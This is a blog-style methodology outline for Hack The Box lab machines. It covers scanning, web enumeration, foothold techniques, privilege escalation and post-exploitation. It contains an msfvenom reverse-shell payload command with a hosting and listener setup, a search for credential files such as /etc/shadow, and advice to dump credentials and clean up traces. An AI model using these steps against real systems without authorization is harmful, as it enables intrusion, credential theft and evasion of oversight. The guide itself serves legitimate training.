---
title: "Methodologies"
date: 2025-06-28 14:42:00 +0500
categories: [Methodologies]
tags: [HTB]
---

## 1. Reconnaissance (Enumeration)

### Objective:

Identify open services, gather information about the target system, and uncover potential attack vectors.

### Tools & Techniques:

#### Basic Network Scanning

```bash
nmap -sC -sV -oN nmap/initial <target-ip>
```

* `-sC`: Run default scripts
* `-sV`: Version detection
* `-oN`: Output to file

#### Full Port Scan (for deeper service discovery)

```bash
nmap -p- --min-rate=1000 -T4 -oN nmap/allports <target-ip>
```

* `-p-`: All 65535 ports
* `--min-rate`: Speed up the scan

#### Targeted Service Scanning

After identifying services:

* **HTTP**: `nikto`, `gobuster`, `feroxbuster`, `whatweb`, `wpscan`
* **SMB**: `enum4linux`, `smbclient`, `crackmapexec`
* **FTP**: Anonymous login, `nmap --script ftp*`
* **SSH**: Banner grabbing, user bruteforce with `hydra`, check for weak keys
* **DNS**: `dig`, `nslookup`, `dnsrecon`
* **SNMP**: `onesixtyone`, `snmpwalk`

#### Directory/File Enumeration

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html
```

#### Subdomain Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://FUZZ.nocturnal.htb -t 80
```

#### Web Tech Stack & Analysis

* `whatweb`, `wappalyzer`, `curl -I`
* Manually browse with **Burp Suite** or **ZAP Proxy**

#### /etc/hosts

Edit `/etc/hosts` file to create hosts entry and tinker with the web interface.

```bash
sudo vim /etc/hosts
10.10.10.150 <box_name>.htb
```

---

## 2. Foothold (Initial Access)

### Objective:

Exploit a vulnerability or misconfiguration to gain low-level access (usually a user shell).

### Techniques & Tools:

#### Web Exploitation

* **Check CMS**: Use `wpscan`, `joomscan`
* **Upload forms, RCE, LFI, SQLi**: Use `Burp Suite`, `sqlmap`
* **Authenticated functionality**: Use `ffuf`/`wfuzz` to fuzz
* **Exposed Git repos**: Download `.git` and extract

#### Exploits

* Search for public exploits:

  ```bash
  searchsploit <service/version>
  ```

  Or use `exploitdb`, `github`, `CVE` search

* Use `Metasploit` for known vulnerable services (optional if allowed)

#### Reverse Shell

Generate a reverse shell payload:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf > shell.elf
python3 -m http.server 80   # to host payload
```

Catch it with:

```bash
nc -lvnp 4444
```

---

## 3. Privilege Escalation (Root)

### Objective:

Elevate privileges from a foothold user to `root` or `NT AUTHORITY\SYSTEM`.

### Tools & Techniques:

#### Manual Enumeration

Run the following script from your foothold:

```bash
linpeas.sh, linenum.sh, lse.sh (for Linux)
winPEASx64.exe, PowerUp.ps1 (for Windows)
```

Or manually check:

* **SUID binaries**: `find / -perm -4000 2>/dev/null`
* **Cron jobs**: `cat /etc/crontab`, `/etc/cron.*`
* **Scheduled tasks (Windows)**: `schtasks /query /fo LIST /v`
* **Misconfigured services**: `systemctl list-units --type=service`
* **Environment variables**: `env`, `PATH` issues

#### Kernel Exploits

Check kernel version:

```bash
uname -a
```

Search for privilege escalation:

```bash
searchsploit linux kernel <version>
```

#### Password Reuse & Creds

* Check `/etc/passwd`, `/etc/shadow`, saved credentials in `.bash_history`, scripts, config files
* Try `sudo -l`

#### Exploiting Sudo Rights

```bash
sudo -l
```

Use [GTFOBins](https://gtfobins.github.io/) or [LOLBAS](https://lolbas-project.github.io/) for binaries you can exploit with sudo privileges.

---

## 4. Post Exploitation

* Dump credentials
* Lateral movement if applicable (less common on HTB standalone)
* Cleanup traces if needed

---

## Resources
For active directory/window boxes:
[SVG](https://raw.githubusercontent.com/Orange-Cyberdefense/ocd-mindmaps/main/img/pentest_ad_dark_2023_02.svg)

For encrypted/encoded passwords:
[CyberChef](https://gchq.github.io/CyberChef/)


---
